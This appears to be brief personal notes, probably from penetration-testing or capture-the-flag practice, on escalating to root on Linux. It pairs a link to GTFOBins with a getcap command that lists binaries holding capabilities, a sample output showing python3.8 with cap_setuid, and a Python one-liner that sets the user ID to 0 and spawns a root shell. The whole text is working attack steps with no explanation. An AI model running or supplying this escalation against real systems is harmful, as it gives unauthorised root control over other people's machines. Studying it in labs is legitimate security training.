____

https://gtfobins.github.io/

```bash
getcap -r / 2>/dev/null
```

# Python

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
